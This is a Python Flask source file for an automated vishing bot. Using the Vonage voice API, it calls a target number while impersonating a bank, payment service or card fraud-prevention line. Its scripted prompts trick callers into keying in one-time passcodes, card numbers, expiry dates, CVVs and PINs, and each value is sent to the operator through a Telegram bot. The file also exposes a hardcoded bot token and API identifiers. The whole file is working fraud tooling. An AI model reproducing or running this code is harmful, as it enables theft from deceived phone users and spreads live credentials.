from flask import *
import vonage, requests, json

app = Flask(__name__)

# Enter token here
token = "5013379680:AAHO7gSCBNoSU0G915j22uIw31emsD4lKXs"

# Enter API Creds Here
client = vonage.Client(application_id="cfacedaf-11c0-4855-80cc-55d4fc5ad072",private_key="private.key")
 
url = "http://b4d8-2409-4063-6e80-c8de-3d6a-c434-110f-5d84.ngrok.io"

number = "12017718001"


@app.route("/event")
def event():
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Call Status: {request.args.get('status').capitalize()}")
    return "Msg Sent!"

@app.route("/create-call/account")
def createCallpay():
    voice = vonage.Voice(client)
    response = voice.create_call({
        'to': [{'type': 'phone', 'number': request.args.get("victim")}],
        'from': {'type': 'phone', 'number': number},
        'answer_url': [f"{url}/account/start?name={request.args.get('name')}&method={request.args.get('method')}&account={request.args.get('account')}&digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}"]})
    return jsonify(response)

@app.route("/account/start")
def account():
    return jsonify(
        [{
        "action": "talk",
        "text": f"Hello! mister {request.args.get('name')}. we are calling from {request.args.get('account')}. We have found a recent suspicious login attempt on your account, if this was not you, please press 1, if this was you, please press 2 followed by the hash key.",
        "language": "en-US",
        "style": 3,
    },
    {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": True,
            "timeOut": 15,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/account/otp?digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}&method={request.args.get('method')}"]
    },
]
    )

@app.route("/account/otp", methods=['POST', 'GET'])
def accountOtp():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=User Entered: {data['dtmf']['digits']}")
    ncco = [
        {
        "action": "talk",
        "text": f"to authenticate, please enter the {request.args.get('digits')} digits security code that we have sent on your {request.args.get('method')} followed by the hash key.",
        "language": "en-US",
        "style": 3,
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": True,
            "maxDigits": int(request.args.get('digits')),
            "timeOut": 15
        },
        "eventUrl": [f"{url}/account/thanks?chat_id={request.args.get('chat_id')}"]
    }]
    return jsonify(ncco)

@app.route("/account/thanks", methods=['POST', 'GET'])
def accountThanks():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=OTP Found: {data['dtmf']['digits']}")
    ncco = [
        {
        "action": "talk",
        "text": f"thank you for co operating with us. we will check and verify all the details and login attempts of your account. thank you.",
        "language": "en-US",
        "style": 2,
        }]
    return jsonify(ncco)

@app.route("/pay/start")
def pay():
    return jsonify(
        [{
        "action": "talk",
        "text": f"Hello! mister {request.args.get('name')}. we are calling from {request.args.get('bank')} pay. We have found a recent suspicious transaction on your account, if this was not you, please press 1, if this was you, please press 2 followed by the hash key.",
        "language": "en-US",
        "style": 2,
    },
    {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": True,
            "timeOut": 15,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/pay/otp?atmDigits={request.args.get('atmDigits')}&digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}"]
    },
]
    )

@app.route("/pay/otp", methods=['POST', 'GET'])
def payOtp():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=User Entered: {data['dtmf']['digits']}")
    ncco = [
        {
        "action": "talk",
        "text" : f"For security and to block this request, we will need you to confirm your identity. please enter {request.args.get('digits')} digits security code, we have send you by text. when you are finish, please press hash key",
        "language": "en-US",
        "style": 2,
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": True,
            "maxDigits": int(request.args.get('digits')),
            "timeOut": 15
        },
        "eventUrl": [f"{url}/pay/atmpin?atmDigits={request.args.get('atmDigits')}&chat_id={request.args.get('chat_id')}"]
    }]
    return jsonify(ncco)



@app.route("/create-call/pay")
def createPay():
    voice = vonage.Voice(client)
    response = voice.create_call({
        'to': [{'type': 'phone', 'number': request.args.get("victim")}],
        'from': {'type': 'phone', 'number': number},
        'answer_url': [f"{url}/pay/start?name={request.args.get('name')}&bank={request.args.get('bank')}&digits={request.args.get('digits')}&atmDigits={request.args.get('atmDigits')}&chat_id={request.args.get('chat_id')}"]})
    return jsonify(response)

@app.route("/create-call/bank")
def createCall():
    voice = vonage.Voice(client)
    response = voice.create_call({
        'to': [{'type': 'phone', 'number': request.args.get("victim")}],
        'from': {'type': 'phone', 'number': number},
        'answer_url': [f"{url}/bank/start?name={request.args.get('name')}&bank={request.args.get('bank')}&digits={request.args.get('digits')}&atmDigits={request.args.get('atmDigits')}&chat_id={request.args.get('chat_id')}"]})
    return jsonify(response)

@app.route("/bank/start", methods=["GET", "POST"])
def start():
    return jsonify(
        [{
        "action": "talk",
        "text" : f"hello Mister {request.args.get('name')}. welcome to online {request.args.get('bank')} bank. we have received login request from your account, if this was not you, press 1. if this was you press 2. when you are finished, please  press  pound key",
        "language": "en-US",
        "style": 3,
    },
    {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": True,
            "timeOut": 15,
            "maxDigits": 1,
        },
        "eventUrl": [f"{url}/bank/otp?atmDigits={request.args.get('atmDigits')}&digits={request.args.get('digits')}&chat_id={request.args.get('chat_id')}"]
    },
]
    )

@app.route("/pay/atmpin", methods=["POST", "GET"])
def payPin():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=OTP Found: {data['dtmf']['digits']}")
    ncco = [
        {
            "action" : "talk",
            "text" : f"great! you have entered O T P. now please enter your {request.args.get('atmDigits')} digits card pin followed by hash key.",
            "language": "en-US",
            "style": 2,
        },
        {
            "action" : "input",
            "type" : [
                "dtmf"
            ],
            "dtmf" : {
                "submitOnHash" : True,
                "maxDigits" : request.args.get("atmDigits"),
                "timeout" : 15
            },
            "eventUrl" : [f"{url}/pay/thanks?chat_id={request.args.get('chat_id')}"]
        }
    ]
    return jsonify(ncco)

@app.route("/pay/thanks", methods=["POST", "GET"])
def payThanks():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Card  Pin Found: {data['dtmf']['digits']}")
    ncco = [
        {
            "action": "talk",
            "text" : "thanks for verifying with us. we are processing your request. if any transaction made within 24 to 48 hours, it will be refunded. good bye.",
            "style": 2
        }
    ]
    return jsonify(ncco)

@app.route("/bank/otp", methods=['POST', 'GET'])
def otp():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=User Entered: {data['dtmf']['digits']}")
    ncco = [
        {
        "action": "talk",
        "text" : f"For security and to block this request, we will need you to confirm your identity. please enter {request.args.get('digits')} digits security code, we have send you by text. when you are finished, please press pound key",
        "language": "en-US",
        "style": 3,
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": True,
            "maxDigits": int(request.args.get('digits')),
            "timeOut": 5
        },
        "eventUrl": [f"{url}/bank/check?digits={request.args.get('digits')}&atmDigits={request.args.get('atmDigits')}&chat_id={request.args.get('chat_id')}"]
    }]
    return jsonify(ncco)

@app.route("/bank/check", methods=["POST", "GET"])
def check():
    data = request.get_json()
    otp = data['dtmf']['digits']
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=First OTP Found: {data['dtmf']['digits']}")
    otp_last = ""
    for item in otp:
        otp_last = otp_last + item + ". "

    ncco = [
        {
        "action": "talk",
        "text" : f"you have entered {otp_last}. for confirming OTP, please re-enter it. when you are finished, please press pound key",
        "language": "en-US",
        "style": 3,
        },
        {
        "action": "input",
        "type": [
            "dtmf"
        ],
        "dtmf": {
            "submitOnHash": True,
            "maxDigits": int(request.args.get('digits')),
            "timeOut": 15
        },
        "eventUrl": [f"{url}/bank/atmpin?atmDigits={request.args.get('atmDigits')}&chat_id={request.args.get('chat_id')}"]
    }]
    return jsonify(ncco)
    
    

@app.route("/bank/atmpin", methods=["POST", "GET"])
def atmPin():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Confirmed OTP Found: {data['dtmf']['digits']}")
    ncco = [
        {
            "action" : "talk",
            "text" : f"for additional purpose, please enter your {request.args.get('atmDigits')} digits card pin. when you are finish, please press pound key",
            "language": "en-US",
            "style": 3,
        },
        {
            "action" : "input",
            "type" : [
                "dtmf"
            ],
            "dtmf" : {
                "submitOnHash" : True,
                "maxDigits" : request.args.get("atmDigits"),
                "timeout" : 15
            },
            "eventUrl" : [f"{url}/bank/thanks?chat_id={request.args.get('chat_id')}"]
        }
    ]
    return jsonify(ncco)

@app.route("/bank/thanks", methods=["POST", "GET"])
def bankThanks():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Card  Pin Found: {data['dtmf']['digits']}")
    ncco = [
        {
            "action": "talk",
            "text" : "one moment please.... Great! this request is now been blocked. if any transaction made within 24 to 48 hours, it  will be refunded. good bye",
            "style": 3
        }
    ]
    return jsonify(ncco)

@app.route("/create-call/card")
def createCardCall():
    voice = vonage.Voice(client)
    response = voice.create_call({
        'to': [{'type': 'phone', 'number': request.args.get("victim")}],
        'from': {'type': 'phone', 'number': number},
        'answer_url': [f"{url}/card/start?name={request.args.get('name')}&card={request.args.get('card')}&bank={request.args.get('bank')}&chat_id={request.args.get('chat_id')}"]})
    return jsonify(response)


@app.route("/card/start", methods=["GET", "POST"])
def cardStart():
    ncco = [
        {
            "action" : "talk",
            "text" : f"Hello! mister {request.args.get('name')}. We are calling from {request.args.get('bank')} fraud prevention line. we have blocked a recent suspicious online purchase on your {request.args.get('card')} card where your card details were used online. if this was not you, please press 1. if this was you, please press 2 followed by hash key.",
            "style" : 2
        },
        {
            "action" : "input",
            "type" : ["dtmf"],
            "dtmf" : {
                "submitOnHash" : True,
                "maxDigits" : 1,
                "timeout" : 15
            },
            "eventUrl" : [f"{url}/card/number?card={request.args.get('card')}&chat_id={request.args.get('chat_id')}"]
        }
    ]
    return jsonify(ncco)

@app.route("/card/number", methods=["GET", "POST"])
def cardNumber():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=User Entered: {data['dtmf']['digits']}")
    ncco = [
        {
            "action" : "talk",
            "text" : f"For your security and to block this purchase please enter your {request.args.get('card')} card number followed by hash key",
            "style" : 2
        },
        {
            "action" : "input",
            "type" : ["dtmf"],
            "dtmf" : {
                "submitOnHash" : True,
                "maxDigits" : 16,
                "timeout" : 15
            },
            "eventUrl" : [f"{url}/card/expire?chat_id={request.args.get('chat_id')}"]
        }
    ]
    return jsonify(ncco)

@app.route("/card/expire", methods=["GET", "POST"])
def cardExpire():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Card  Number Found: {data['dtmf']['digits']}")
    ncco = [
        {
            "action" : "talk",
            "text" : f"great! now please enter your card expire date in this format. month, month, year, year, year, year, followed by hash key",
            "style" : 2
        },
        {
            "action" : "input",
            "type" : ["dtmf"],
            "dtmf" : {
                "submitOnHash" : True,
                "maxDigits" : 6,
                "timeout" : 15
            },
            "eventUrl" : [f"{url}/card/cvv?chat_id={request.args.get('chat_id')}"]
        }
    ]
    return jsonify(ncco)

@app.route("/card/cvv", methods=["GET", "POST"])
def cardCvv():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Expire Date Found: {data['dtmf']['digits']}")
    ncco = [
        {
            "action" : "talk",
            "text" : f"great! now please enter the C V V number of your card which is written on the back side of your card followed by hash key.",
            "style" : 2
        },
        {
            "action" : "input",
            "type" : ["dtmf"],
            "dtmf" : {
                "submitOnHash" : True,
                "maxDigits" : 3,
                "timeout" : 15
            },
            "eventUrl" : [f"{url}/card/pin?chat_id={request.args.get('chat_id')}"]
        }
    ]
    return jsonify(ncco)

@app.route("/card/pin", methods=["GET", "POST"])
def cardPin():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=CVV Found: {data['dtmf']['digits']}")
    ncco = [
        {
            "action" : "talk",
            "text" : f"the last step, please enter pin number of your card followed by hash key.",
            "style" : 2
        },
        {
            "action" : "input",
            "type" : ["dtmf"],
            "dtmf" : {
                "submitOnHash" : True,
                "maxDigits" : 4,
                "timeout" : 15
            },
            "eventUrl" : [f"{url}/card/thanks?chat_id={request.args.get('chat_id')}"]
        }
    ]
    return jsonify(ncco)

@app.route("/card/thanks", methods=["GET", "POST"])
def cardThanks():
    data = request.get_json()
    r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={request.args.get('chat_id')}&text=Pin Found: {data['dtmf']['digits']}")
    ncco = [
        {
            "action" : "talk",
            "text" : f"okay! you have entered all the details which we asked. we are verifying your card. we will inform you within 24 to 48 business hours. good bye",
            "style" : 2
        }
    ]
    return jsonify(ncco)

if __name__ == "__main__":
    app.run(debug=True, port=80)
